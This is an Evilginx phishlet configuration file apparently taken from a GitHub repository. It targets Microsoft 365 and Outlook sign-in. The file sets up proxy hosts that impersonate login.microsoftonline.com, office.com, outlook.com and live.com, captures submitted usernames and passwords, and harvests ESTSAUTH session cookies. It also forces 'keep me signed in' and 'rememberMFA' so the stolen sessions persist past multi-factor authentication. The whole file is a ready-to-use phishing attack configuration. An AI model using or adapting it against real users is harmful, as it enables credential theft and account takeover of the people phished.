## Github repo: https://github.com/faelsfernandes/evilginx3-phishlets/blob/main/o365-mfa.yaml

### Note that this is a .yaml file

name: 'o365-mfa'
author: '@faelsfernandes'
min_ver: '2.4.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
  - {phish_sub: 'device.login', orig_sub: 'device.login', domain: 'microsoftonline.com', session: true, is_landing:true}
  - {phish_sub: 'outlook', orig_sub: 'www', domain: 'outlook.com', session: false, is_landing:true}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: false, is_landing:true}

sub_filters:
auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT','SignInStateCookie',]
  - domain: 'login.microsoftonline.com'
    keys: ['ESTSAUTHLIGHT']   
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'     
login:
  domain: 'login.microsoftonline.com'
  path: '/' 
force_post:
  - path: '/kmsi'
    search: 
      - {key: 'LoginOptions', search: '.*'}
    force:
      - {key: 'LoginOptions', value: '1'}
    type: 'post'
  - path: '/common/SAS'
    search: 
      - {key: 'rememberMFA', search: '.*'}
    force:
      - {key: 'rememberMFA', value: 'true'}
    type: 'post'
